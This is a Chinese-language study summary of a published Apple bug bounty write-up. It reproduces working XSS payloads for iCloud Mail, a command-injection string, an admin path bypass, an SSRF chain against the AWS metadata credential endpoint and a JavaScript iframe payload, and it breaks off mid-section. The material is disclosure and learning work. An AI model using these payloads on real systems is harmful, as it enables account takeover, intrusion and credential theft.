# 2022-04-07：samwcyo We Hacked Apple for 3 Months: Here’s What We Found
## October 7, 2020 samwcyo
### https://samcurry.net/hacking-apple
---------------------
作者之前以為 Apple BB 只針對硬體，在了解到任何重大問題都有 BB 時，立刻招集人馬來玩玩
- Sam Curry (@samwcyo)
- Brett Buerhaus (@bbuerhaus)
- Ben Sadeghipour (@nahamsec)
- Samuel Erb (@erbbysam)
- Tanner Barnes (@_StaticFlow_)

最後發現了 55 個漏洞，其中 11 個 critical、29 個 high 、13 個 m 和 2 個 l  

這篇 blog 列出幾個他認為比較有趣的 case  

## Recon
第一步 Recon，弄清楚 Apple 有哪些可以訪問
- 掃描的所有結果都在儀表板中編入索引
  - HTTP status code, headers, response body, and screenshot of the accessible web servers

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/recon_img-1024x524.png)  

Apple 擁有整個 `17.0.0.0/8` 的 IP range
- 其中包括 25,000 個 Web servers，其中 10,000 個在 apple.com 下
- 另外 7,000 個 unique domains
- 最重要的是，他們自己的 Top-level Domain（dot apple）
- 我們的時間主要花在 17.0.0.0/8 IP 、.apple.com 和 .icloud.com 上

我們開始對有趣的 server 進行 `directory brute forcing`  
自動掃描的直接發現是
- VPN servers affected by Cisco CVE-2020-3452 Local File Read 1day (x22)
- Leaked Spotify access token within an error message on a broken page

這些過程有助於了解在 Apple 中，授權/身份驗證的工作方式、存在哪些客戶/員工 Applcation、使用了哪些 integration /開發工具以及各種可觀察到的行為，例如 Web  server 使用某些 cookie 或重定向到某些 Application  

在完成所有掃描並且我們覺得我們對 Apple 基礎架構有了大致的了解之後，開始針對那些感覺比其他人更容易受到攻擊的單個 Web server  

無法寫出發現的所有漏洞，這裡是一些更有趣的漏洞的案例  

## Full compromise `Apple Distinguished Educators Program` 的身份驗證和授權
Apple Distinguished Educators 網站
- 這是一個僅限邀請的 Jive 論壇
- 用戶可以使用他們的 Apple 帳號進行身份驗證

這個論壇的有趣之處在於
- 註冊到 Application 的一些核心 Jive 功能是通過 Apple 構建的自定義中間件頁面移植的，以便將他們的身份驗證系統 (IDMSA) 連接到通常使用用戶名/密碼身份驗證的底層 Jive 論壇.

這是為了讓
- 用戶可以輕鬆地使用他們現有的 Apple 帳號向論壇進行身份驗證
- 而不必處理創建額外的用戶帳號。只需使用“使用 Apple 登錄”並登錄到論壇。

Landing page 是不允許 User 訪問論壇的
- 可以在其中提供有關自己的資料，這些資料由論壇版主評估以供批准

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_reg_upda.png)  


當提出申請時，就像你正常註冊到 Jive 論壇一樣
- 這將允許 Jive 論壇根據你的 IDMSA cookie 知道你是誰
- 因為它將你屬於你的 Apple 帳號的電子郵件地址與論壇相關聯。

隱藏在 Application 頁面上註冊以使用論壇的值之一是 password 字段
- 值為 `###INvALID#%!3`
- 當送出你的用戶名、名字和、電子郵件地址和雇主的申請時，你還提交了一個 password 值
- 該值隨後被秘密綁定到你的帳號，該值來自頁面上的隱藏 input

```html
<div class="j-form-row">
<input id="password" type="hidden" value="###INvALID#%!3">
<div id="jive-pw-strength">
...
```


在觀察到這隱藏的密碼後
- 我們立即想到找到一種方法來手動驗證 Application 並訪問已批准的論壇帳號
- 而不是嘗試使用「使用 Apple 登錄」系統登錄
- 因為我們每個人在單獨註冊時的密碼都是相同的
- 如果有人使用此系統申請並且存在可以手動驗證的功能，你只需使用默認密碼登錄他們的帳號，完全繞過「使用 Apple 登錄」登錄。

結果，似乎無法手動進行身份驗證，但經過幾次 Google 搜索後
- 發現了一個 `cs_login` endpoint 
- 用於使用用戶名和密碼登錄 Jive  Application

當我們手動測試 HTTP 請求以向 `Apple Distinguished Developers` Application 進行身份驗證時
- 它試圖通過顯示不正確的密碼錯誤來對我們進行身份驗證
- 當使用我們之前申請的自己的帳號時，Application 出錯並且不允許我們進行身份驗證
  - 因為我們尚未獲得批准
- 如果我們想進行身份驗證，我們必須找到已批准成員的用戶名

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_authentication.png)  



此時，我們將 HTTP request 丟到到 `Burp Suite’s intruder` 中
- 試通過登錄名和默認密碼暴力破解 1 到 3 個字之間的用戶名。
- 大約兩分鐘後，我們收到了一個 302 response，表明使用我們之前找到的默認密碼成功登錄了具有 3 個字的用戶名的用戶

我們進去了！從這一點開始
- 我們的下一個目標是作為「具有提升權限的人」進行身份驗證
- 我們對我們的訪問進行了一些截圖，然後看「用戶列表」以查看哪些用戶是管理員
- 我們登錄了在列表中看到的第一個帳號，試圖證明可以通過管理功能實現遠程程式碼執行

但是，仍然存在一些障礙

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/ade_x-1024x529.png)  

嘗試以管理員帳號瀏覽 `/admin/`（Jive 管理員控制台）時
- Application 會導去登錄，就好像尚未通過身份驗證一樣
- 這很奇怪，因為這是 Jive Application 的自定義行為
- 我們的猜測是，Apple 已經根據 IP 地址限制了 admin dashboard，以確保 Application 不會被破壞

我們嘗試
- 使用 `X-Forwarded-For` header 繞過假設的限制，但失敗了
- 嘗試的是載入不同形式的 `/admin/`，以防 Application 具有用於訪問管理員控制台的路徑特定黑名單。

僅僅幾個 HTTP 請求之後
- 發現 `GET /admin;/` 將允許攻擊者訪問管理控制台
- 我們通過設置 `Burp Suite` 規則來自動繞過這種繞過
- 該規則在我們的 HTTP 請求中自動將 `GET/POST /admin/` 更改為 `GET/POST /admin;/`

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/match_and_replace.png)  


當我們載入 administration console 時，立即發現有些地方不對勁
- 我們無法存取正常的功能、來執行 remote code
  - （ no templating, plugin upload, nor the standard administrative debugging functionality）

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/welcome_to_jive-1024x388.png)  


我們意識到，認證的帳號可能不是 Application 的“核心”管理員
- 我們繼續驗證了另外 2-3 個帳號
- 然後最終驗證為核心管理員並看到允許遠程程式碼執行的功能

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/jive_home-1024x477.png)  

攻擊者可以
1. 通過使用隱藏的默認登錄功能手動進行身份驗證來繞過身份驗證
2. 通過在請求中發送修改後的 HTTP 路徑來訪問管理控制台
3. 通過使用許多 `baked in RCE` 的功能，如 plugin 上傳、templating 或文件管理。

總的來說，這將允許攻擊者...
- 在 ade.apple.com 上執行任意命令
- 訪問用於管理用戶帳號的內部 LDAP 服務
- 訪問大部分 Apple 內部網路

至此，我們完成了報告並回報了所有內容  

## 繞過 Authentication 對 DELMIA Apriso 的 full Compromise

這段時間，我們經常思考是 Apple 是否有任何與 manufacturing 和 distribution 的服務可訪問
- 有一個名為 `DELMIA Apriso` application 是第三方 global Manufacturing Suite
- 它提供了各種 warehouse solutions


![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/DELMIA_Apriso_2016_ProductMap_000.png)  

遺憾的是，沒有太多能互動的東，因為只能從界面 login 和 reset password

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/colormasters-1024x364.png)  

嘗試在一些頁面上查找漏洞後，發生了一些奇怪的事情
- 網站右上角出現的一個欄，我們被驗證為 `Apple No Password User` 的用戶

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/app_no_pw.png)  

情境是
1. clicking "Reset Password"
2. 我們被臨時認證為具有「權限」使用該頁面的用戶

重置密碼頁面本身就是一個頁面，所以為了讓我們使用它，
- application 自動將我們登錄到一個能夠使用該頁面的帳號
- 我們嘗試了各種方法來提升我們的權限，很長一段時間都沒有取得任何進展

過了一會兒
- 我們向 OAuth endpoint 發送了一個 HTTP request，試圖生成一個 `authorization bearer`
- 我們希望可以用它來探索 API，結果成功！

我們的 account
- 即使它的權限被限制為授權和重置我們的密碼
- 也可以生成一個有權訪問 Application API 的 bearer

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/req-rez-1024x179.png)  

我們探索 API
- 希望找到允許我們破壞 application 的某些部分的權限問題
- 幸運的是，偵察過程中找到了 app 的 API 列表

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/web_api_ref.png)  

遺憾的是，無法訪問大多數 API 調用
- 如果點 `/Apriso/HttpServices/api/platform/1/Operations` endpoint，它返回近 5,000 個不同 API calls
- 除了我們最初發送的 authorization bearer 之外，這些都不需要身份驗證

這裡透露的操作包括
- 創建和修改 shipments
- 創建和修改 employee paydays
- 創建和修改 inventory information
- Validating employee badges
- Hundreds of warehouse related operations

我們最關注的是 `APL_CreateEmployee_SO`  

使用以下格式向特定 GET request：

```
GET /Apriso/HttpServices/api/platform/1/Operations/operation HTTP/1.1
Host: colormasters.apple.com
```

HTTP response:
```json
{
  "InputTypes": {
    "OrderNo": "Char",
    "OrderType": "Integer",
    "OprSequenceNo": "Char",
    "Comments": "Char",
    "strStatus": "Char",
    "UserName": "Char"
  },
  "OutputTypes": {},
  "OperationCode": "APL_Redacted",
  "OperationRevision": "APL.I.1.4"
}
```

但過了一段時間我們意識到，為了真正調用 API
- 必須送一個 JSON data 的 POST request
```json
{
  "inputs": {
    "param": "value"
  }
}
```

上面的格式（事後）看起來非常簡單易懂
- 但是在攻擊的時候，我們完全不知道格式
- 我甚至嘗試向提供軟體的公司發 email，詢問應該這些 API 的格式，但他們不會回電子郵件，因為我沒有訂閱該服務。
- 我花了將近 6 個小時試圖弄清楚如何形成上述 API 格式
- 但在我們弄清楚之後，它非常順利
  - `create employee` 功能需要依賴於 UUID 的各種參數，但我們能夠通過其他 `Operations` 檢索這些參數，並在我們進行時填寫它們。

又過了大約兩個小時，我們終於形成如下的 API 請求：

```
POST /Apriso/HttpServices/api/platform/1/Operations/redacted HTTP/1.1
Host: colormasters.apple.com
Authorization: Bearer redacted
Connection: close
Content-Type: application/json
Content-Length: 380
{
  "inputs": {
    "Name": "Samuel Curry",
    "EmployeeNo": "redacted",
    "LoginName": "yourloginname123",
    "Password": "yourpassword123",
    "LanguageID": "redacted",
    "AddressID": "redacted",
    "ContactID": "redacted",
    "DefaultFacility": "redacted",
    "Department": "",
    "DefaultMenuItemID": "redacted",
    "RoleName": "redacted",
    "WorkCenter": ""
  }
}
```

發送此 API 後
- 現在可以作為 app 的 global administrator 進行身份驗證
- 使我們能夠完全使用 warehouse management software，並可能來 RCE

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/10/memrz-1024x469.png)  

有數百種不同的功能會導致大量 data leak，有些關鍵的 app 能夠破壞用 inventory and warehouse management

## Wormable Stored Cross-Site Scripting 弱點，允許 attacher 修改 email 來偷 iCloud 的資料

iCloud 是 Apple 的核心之一，用來存照片、影片文件、App 相關 data 的地方。  
iCloud 也提供 email, find me 等服務  

email 是完整的 email service，iOS and Mac 都有預設安裝 email application。email 和文件都一起託管在 `www.icloud.com` 上面  
- 這代表，從 attacker 角度來看，任何 cross-site scripting 弱點，將允許 attacker 存取任何 data

email app 的工作方式很單純
- 當 app 收到 email，User 打開時，data 會是一個 JSON blob，然後被 sanitized 後，將部份內容給 JS 顯示

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/icloud-mail.jpg)  

這代表，過程中，沒有經過 server 處理過 email content 的 sanitation  
- 呈現和處理 email content 都是由 client 的 JS 中處理
- 這不一定是壞事，但簡化了我們怎麼去了解該怎麼樣達成 XSS 的過程（有機會看 source code）


### 透過混淆的 Style Tag 來存 XSS 進去
`<style>` 是個特別的 tag，因為 DOM 只會取消帶有結束 `</style>` 的 tag element  

如果我們寫 `<style><script>alert(1)</script></style>`，這不會有 prompt
- 因為 tag 的 content 是嚴格的 css ，而且 script 是放在「結束 tag」內，不是之外


從清理的角度來看
- Apple 唯一需要擔心的是結束樣式標籤，或者
- 如果頁面上有敏感 data，則通過 import chaining 來進行 CSS injection

我決定專注於嘗試在 Apple 沒有意識到的情況下突破 style tag
- 因為如果可以實現，這將是一個非常簡單的 `stored XSS`

我嘗試了一段時間，嘗試了各種排列，最終發現了一些有趣的事情：
- 當在 email 中有兩個 `style` 時，`style` 的 content 將連接在一起成為一個 `style
- 這意味著，如果可以將 `</sty` 放入第一個 style，將 `le>` 放入第二個標籤，就有可能誘使 app 認為我們的 style 仍然處於打開狀態，而實際上並非如此

我發送了以下 payload 來測試，結果成功了

```html
<style></sty</style>
<style>le><script>alert(1)</script></style>
```

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/alert-1.png)  

頁面的 DOM 顯示這樣：
```html
<style></style><script>alert(1)</script></style>
```
上面 payload 的解釋如下：  
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram_explan.png)  


由於 email service 是在 `www.icloud.com`，這意味著我們有權限看 iCould 服務 API 的 http response  

基於這一點，我們 POC 目標是
- 竊取受害者所有的個人資料（照片、日曆和文件）
- 然後將相同的漏洞轉發給他們的所有聯絡人

我們構建了一個簡潔的 PoC
- 它將從 iCloud API 返回照片 URL
- 將它們放到 image tag 中
- 然後在其下方附加用戶帳號的聯絡人清單

這表示可以檢索這些值
- 但為了洩露它們，我們必須繞過 CSP
- 這意味著除了 `.apple.com` 和其他少數 domain 之外，其他都沒法輕易的 outbound HTTP request

幸運的是，該服務是一個 email client
- 可以簡單地使用 JavaScript 調用自己的 email，附加 iCloud 照片 URL 和 contact
- 然後 fire away 所有受害者簽名的 iCloud photo 和 file URL

以下影片演示了受害者的照片被盜時的概念證明。在惡意方執行的完整利用場景中，攻擊者可以悄悄竊取受害者的所有照片、影片和文檔，然後將修改後的電子郵件轉發到受害者的聯繫人列表，並針對 iCloud 郵件服務蠕蟲跨站點腳本有效負載.
這個 [影片 (https://youtu.be/jclY-s2kJ7E)](https://youtu.be/jclY-s2kJ7E) 是 POC
- 展示了受害者照片被盜
- 攻擊者能悄悄竊取受害者的所有照片、影片和 file
- 然後將修改後的 email 轉發到受害者的聯絡人，並針對 iCloud email service worm the cross-site scripting payload


### 透過 Hyperlink Confusion 來 Stored XSS

後來發現了第二個以類似方式影響 email 的 cross-site scripting vulnerability   
對於這類半 HTML 的 application
- 通常我會做的事情是，它們如何處理超鏈接 (hyperlinks)
- 自動將未標記的 URL 轉換為 hyperlinks 似乎很直覺
  - 但如果沒有正確清理或與其他功能結合使用，它可能會變得混亂
  - 由於依賴於正則表達式、innerHTML 以及可以在 URL 旁邊加的所有可接受的 element
  
因此這是 XSS 的常見的地方  

這個 XSS 有趣的地方在於，它完全刪除某些 tag，例如 `<script>` and `<iframe>`
- 因威某些內容將依賴於特定的字元，像是 space, tab or new line 等等  
- 而刪除 tag 留下的 void 可以在不告訴 JavaScript parser 的情況下提供這些字元
- 這些忽略，允許 attacker 混淆 app 並潛入 call XSS 的惡意字元

我在這兩個功能上玩了一段時間(automatic hyperlinking and the total removal of certain tags)
- 直到決定將兩者結合起來並嘗試查看它們的行為方式
- 驚訝的是，以下字符串破壞了 hyperlinking 功能並混淆了 DOM

```
https://www.domain.com/abc#<script></script>https://domain.com/abc
```

在 email 送出後，內容被解析​​為以下內容：

```html
<a href="https://www.domain.com/abc#<a href=" https:="" www.domain.com="" abc="&quot;" rel="noopener noreferrer">https://www.domain.com/abc</a>
```

最初看到這很有趣
- 但利用它會有點困難
- 在 tag 中定義 attri 很容易（如 src、onmouseover、onclick 等），但提供值會很困難
- 因為仍然必須匹配 URL 正則表達式，它才不會 escape automatic hyperlinking 功能

最終在不發送單引號、雙引號、括號、空格或反引號的情況下，成功的 payload 為

```
https://www.icloud.com/mail/#<script></script>https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//
```

解析出來如下，這也彈出 prompt 了

```html
<a href="https://www.icloud.com/mail#<a href=" https:="" www.icloud.com="" onmouseover="location=/javascript:alert%28document.domain%29/.source;//&quot;">https://www.icloud.com/onmouseover=location=/javascript:alert%28document.domain%29/.source;//</a>
```

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/2nd_xss.png)  


我最好的解釋是
1. 在載入初始 URL 時，`<script></script>` 中的字元在 automatic hyperlinking 過程中是可以接受的並且沒有破壞它，然後
2. removal of the script tags 建立了一個空格或某種空白，它在不關閉初始 hyperlink 功能的情況下重置了 automatic hyperlinking 能，最後
3. 第二個 hyperlink 加了用於突破 href 和 create onmouseover 事件處理程序的附加 quote

第二個 XSS 的影響與第一個相同，除了這個，用戶必須將滑鼠放在 email 中的某個位置來觸發 onmouseover 事件處理程序，但這部分可以簡化為更容易觸發整個 email 的 hyperlink

攻擊者可能會用它來
1. 建立一個能偷偷竊取/修改 iCloud account data (photo, video) 的 worm
2. 在受害者的瀏覽器中偷偷執行任意 HTML 和 JavaScript


## 對 `Author’s ePublisher` command Injection
 
Apple 其中一個主要服務是賣書、電影、TV show 和歌曲  
User 上傳檔案，散播到各種 Apple 服務，例如 iTuren。這對 User XSS 和 員工的 XSS 會是很好的路徑  

為了要上傳檔案，我們必須先在 `iTunes Connect` 上申請該服務  


我們遇到了一個有趣的問題
- 我們無法使用 iPad 或 iPhone
- 但我們仍在繼續尋找使用該服務的方法
- 經過調查，我們發現了一個名為 Transporter 的工具。

[Transporter](https://help.apple.com/itc/transporteruserguide/#/)
- 是 Java application
- 用於與 `jsonrpc` API 互動，以利用幾種不同的文件服務，批次上檔案

同時
- 我們還查看了 [iTunes Connect Book help docs](https://itunespartner.apple.com/books/)
- 發現一個頁面解釋了上傳圖書的幾種不同方式，包括一個 online web service
  - https://itunespartner.apple.com/books/articles/submit-your-ebook-2717

這讓我們找到了 [Apple Books for Authors](https://authors.apple.com/epub-upload)
- https://authors.apple.com/epub-upload

這 service 只有幾個特點
- 登錄/註冊
- 上傳書籍封面的圖片
- 上傳圖書 ePub file
- 上傳圖書 Sample ePub file


我們做的第一件事是
- 下載 sample epub file 並上傳它
- 有趣的是，我們抓的第一個 epub 文件是 version 1 format，帶有無效 xhtml
- 發布工具吐出一大串錯誤內容，讓我們知道為什麼它無法上傳/驗證


### HTTP Request:
```
POST /api/v1/validate/epub HTTP/1.1
Host: authors.apple.com
{"epubKey":"2020_8_11/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub","providerId":"BrettBuerhaus2096637541"}
```

### HTTP Response:
```
[2020-08-11 21:49:59 UTC] <main> DBG-X:   parameter TransporterArguments = -m validateRawAssets -assetFile /tmp/10f7f9ad-2a8a-44aa-9eec-8e48468de1d8_sample.epub -dsToken **hidden value** -DDataCenters=contentdelivery.itunes.apple.com -Dtransporter.client=BooksPortal -Dcom.apple.transporter.updater.disable=true -verbose eXtreme -Dcom.transporter.client.version=1.0 -itc_provider BrettBuerhaus2096637541
```

正如你現在可能猜到的那樣，我們對 `provderId` JSON 值進行簡單的 command injection  
我們在下一次上傳時攔截了 request 並將其替換為

```
"providerId":"BrettBuerhaus2096637541||test123"
```

結果是！
```
/bin/sh: 1: test123: not found
```

接著我們改串 `ls` ...，結果

![](https://i.imgur.com/njo88pO.png)  

總結，攻擊者可能會用它來
- 在 authors.apple.com server 上執行任意命令
- 訪問 Apple 的內部網絡


這是一個很好的練習，也是一個很好的提醒
- 確保充分探索你正在測試的內容
- recon 研究中的許多名人都在談建立一個  mind maps，這就是一個例子
- 我們從 iTunes Connect 開始，開始探索圖書，並繼續擴展
- 直到我們完全了解圍繞該單一功能存在哪些服務

在你開始測試之前
- 需要找到盡可能多的 information 。如果不看 help doc
- 你可能完全錯過了網絡 epub app，因為它只是一個頁面上的 link


## iCloud 上的 full Response SSRF，讓 attacker 能看 Apple source code
- SSFR (Server-Side Request Forgery)
- Blind SSRF: 利用 SSRF 時，無法讀取 response，這類稱為 Blind SSRF


我們找到數十個 blind or semi-blind SSRFs，但很難找到任何方法來 retrieve the response  
- 令我們非常沮喪，因為在 recon 過程中，我們發現大量關於 source code 管理、client 管理、 information lookup, and customer support.

快要放棄時，才終於偶然發現了一個似乎擁有大量內部網路訪問權限的產品  


在測試 iCloud App 期間，我們注意到
- 可以通過 `Open in Pages` 在 iCloud app 中打開 iCloud mail application 中的某些附件

當 submit form 時
- 它會送 HTTP request，其中包含一個 URL 參數
- 該參數包括請求中 email 文件附件的 URL
- 如果將此 URL 修改為任意內容，則收到 `400 Bad Request`
- 該過程將建立一個 `“job”`，將 HTTP response 轉換為 Apple Pages 文檔，然後在新 tab 中打開

![](https://i.imgur.com/g6oTd8y.png)  

它似乎只允許來自 `p37-mailws.icloud.com` domain 的 URL
- 不會轉換只有 200 OK HTTP response 的頁面
- 而且轉換過程是通過多個 HTTP request 和 job queue 完成的
- 因此測試起來困難


![](https://i.imgur.com/FCrEKbj.png)

利用這一點的方法是在 `white-listed` domain 之後附加 `@ourdomain.com`
- 這會將 request 指向我們的 domain
- 該過程會將原始 HTML 轉換為 Apple page 文件，然後在新窗口中顯示給我們
- 這有點煩人，所以我們最終拼湊了一個 python script 來自動化這個過程。

```
https://gist.github.com/samwcyo/f8387351ce9acb7cffce3f1dd94ce0d6
```

我們的 POC 證明了
- 讀取和訪問 Apple 的內部 maven repo
- 我們沒有訪問任何 source code，也沒有被其他參與者利用過
- 如果文件太大而無法保存到 Pages 文件中，它會以可下載的 zip
  - 這樣就可以提取 jar 和 zip 等大文件。
- 我們在 Github repo 中發現了內部 maven URL。

![](https://i.imgur.com/gzyxzAr.png)  


我們可以從中提取許多其他內部 application
- 但是由於 POC 能 source code 訪問 Maven，因此我們立即 report 了

總的來說，攻擊者可能會用它來...
- 讀 maven repo 中的各種 iOS source code
- 訪問 Apple internal network 中可用的任何其他內容
- Fully compromise a victim's session via a cross-site scripting vulnerability due to the disclosed HTTP only cookies within the HTTP request

The full process that had to be followed when scripting this is as follows:

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/process.png)  


## 透過 REST Error Leak 來存取 Nova Admin Debug Panel

在
Nova 管理員調試面板通過 REST 錯誤洩漏訪問
在逐個瀏覽所有 Apple subdomain list 時
- 我們從 `concierge.apple.com`、`s.apple.com` 和 `events.apple.com` 中發現了一些有趣的功能。

通過 Google dorking
- 我們發現對 `s.apple.com` 的特定 request 會將你帶到帶有  authentication token 的 `events.apple.com`

HTTP Request:
```
GET /dQ{REDACTED}fE HTTP/1.1
Host: s.apple.com
```

HTTP Response:
```
HTTP/1.1 200
Server: Apple
Location: https://events.apple.com/content/events/retail_nso/ae/en/applecampathome.html?token=fh{REDACTED}VHUba&a=1&l=e
```

執行我們的標準 recon 流程時
- 我們抓了 JavaScript file 並開始尋找 endpoints 和 API routes

![](https://i.imgur.com/Khvao1e.png)  

發現 `/services/public/account` 後
- 我們開始使用它。我們很快發現，傳入無效的 marketCode parameter，server 會 retunr REST exception error


### HTTP Request:
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/request_x-1.png)  

### HTTP Response:
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/edit_me_now-1.png)  

從錯誤消息中我們可以看到 server 正在將 API request 轉到以下位置：

```
https://nova-admin.corp.apple.com/services/locations/searchLocation?locationName=t&rtm=1
```

我們可以看到它透露了一些 request/response header
- 包括 `nova-admin` cookie 和 server 發送的  authorization token 以向 `nova-admin.corp.apple.com` API requesrt 發出 requesrt

同樣有趣的是 `/services/` endpoints 類似於 application 的 `/services/public/` API
- 我們無法訪問 application 的 endpoint，也無法訪問 `nova-admin.corp.apple.com`
- 回到我們的 recon data，我們注意到有一個 `nova.apple.com`

嘗試使用獲取的 auth token and cookie 
- 我們注意到 `credentials` 是有效的，因為我們不再被導回重 idsmac auth
- 但它仍然是 403 forbidden

通過一點 fuzzing 測試，我們發現我們能夠訪問 `/services/debug.func.php`
- 似乎向 route 加 extension 都會繞過他們構建的 route restrictions，因為 authorization 與功能本身是分開的。


### HTTP Request:
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/last_one.png)  

### HTTP Response:
![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/new_two-1.png)  

這入口包含數十個 options，還包含數百個 configuration parameters and values

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-1.png)  

其中一個值還包含 AWS secret key，另一個包含 server crontab
- 能夠 update 這些值，足以證明能做到 command injection


![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/pasted-image-0-3.png)  

總的來說，攻擊者可能會用它來...
- 在 `nova.apple.com` server 上執行任意命令
- 訪問 Apple 的內部網路

上面的完整流程如下：


![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/diagram-1.png)


## 通過 PhantomJS iTune Banners 和 Book Title 的 XSS 拿到 AWS Secret Keys

我們發現了 iTunes banner maker 網站
- 我們通過 `iTunes Connect` 新增一本書
- 我們才發現 `banner maker` 的一個有趣功能。

![](https://i.imgur.com/a94Z6xV.png)  

根據指定的高度和寬度，有多種 banner image format
- 我們發現 `300x250` banner image 包含 book name

我們還注意到**它容易受到 Cross-Site Scripting 攻擊**
- 因為書名帶有我們在 `iTunes connect` 上註冊該書時設置的注入的 `<u>` element

![](https://i.imgur.com/KvHUtLU.png)  

Image URL:
```
https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&t=catalog_black&c=us&l=en-US&id=1527342866&w=300&h=250&store=books&cache=false
```

前面我們已經發現，在一些 request 參數如 `pr` 中存在 path traversal and parameter injection  

例如：
```
https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes/../../&t=catalog_black&c=us&l=en-US&id=1527342866&w=300&h=250&store=books&cache=false
```

結果會出現 AWS S3 錯誤頁面

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/banner.png)  

從這裡我們假設他們使用 headerless browser client 來截取 S3 bucket 內的 HTML 文件的 screenshots
- 因此，下一步是創建一本書，名稱中包含 `<script src=””>`
- 以便在圖產生過程中用 XSS

我們注意到的第一件事是在 request log 誌中，當它到達我們的 server 時：

```
54.210.212.22 - - [21/Aug/2020:15:54:07 +0000] "GET /imgapple.js?_=1598025246686 HTTP/1.1" 404 3901 "http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"
```

這是它用來產生圖片的 S3 bucket / image

```
http://apple-itunes-banner-builder-templates-html-stage.s3-website-us-east-1.amazonaws.com/itunes/catalog_white/index.html?pr=itunes&t=catalog_white&c=us&l=en-US&id=1528672619&w=300&h=250&store=books&cache=false
```

這是 User-Agent:

```
PhantomJS/2.1.1
```

首先是寫我們的 JS XSS payload 來執行 Server Side Request Forgery attacks
- 執行此操作並呈現資料的一個好方法是使用 `<iframe> `元素。

```js
function getQueryParams(qs) {
  qs = qs.split('+').join(' ');

  var params = {},
    tokens,
    re = /[?&]?([^=]+)=([^&]*)/g;

  while (tokens = re.exec(qs)) {
    params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]);
  }
  return params;
}

var query = getQueryParams(document.location.search);
var iframe = document.createElement("iframe");
iframe.src = query.url;
var iframeParent = document.getElementById("meta");
iframeParent.appendChild(iframe);
```

由於我們在 AWS 上知道這一點，因此我們嘗試訪問 AWS metadata URI：  

```
https://banners.itunes.apple.com/bannerimages/banner.png?pr=itunes&t=catalog_black&c=us&l=en-US&id=1528672619%26cachebust=12345%26url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance%26&w=800&h=800&store=books&cache=false
```

這會 render 新的 banner image
- 其中包含 ec2 和 iam 角色的完整 AWS key：

![](https://secureservercdn.net/198.71.233.25/623.f31.myftpupload.com/wp-content/uploads/2020/08/image-1.png)  

大多數 Apple 有趣的基礎設施似乎都在`/8 IP CIDR` 中，他們稱為 `Applenet`
- 但他們在 AWS ec2/S3 中確實有相當多的主機和服務
- 我們知道 SSRF 不會對我們執行的偵察非常有趣
- 因為大多數有趣的 corp targets 都在 Applenet 而不是 AWS。

總的來說，攻擊者可能會用它來
- 從 Apple 的內部 Amazon Web Services 環境中讀取內容
- 從 metadata page，存取到 AWS ec2 keys

## Apple eSign 上的 Heap Dump 允許攻擊者破壞各種外部員工管理工具


在我們最初的 recon 階段收集 sub-domaints 並發現 Apple 的 public-facing 表面時
- 我們發現了一堆 `esign`
- https://esign-app-prod.corp.apple.com/
- https://esign-corpapp-prod.corp.apple.com/
- https://esign-internal.apple.com
- https://esign-service-prod.corp.apple.com
- https://esign-signature-prod.corp.apple.com
- https://esign-viewer-prod.corp.apple.com/
- https://esign.apple.com/

載入 subdomain 後，會立刻 redirected 到 `/viewer` 資料夾
- 當經過 `Apple idmsa authentication flow` 時，會 return `you are not authorized` error

![](https://i.imgur.com/tFKClIe.png)  

我們無法從此頁面訪問任何 links 或有趣的 js 文件
- 因此我們嘗試了一些 wordlists 的來看是否可以找到 application endpoints
- 從這裡我們發現 `/viewer/actuator` response 所有 actuator endpoints ，包括 mapping 和 heapdump

![](https://i.imgur.com/eo7Yjbt.png)  

我們無法通過向 state-changing requests 來嘗試 Remote Code Execution 來進行更改
- 因此必須找到替代途徑來證明影響

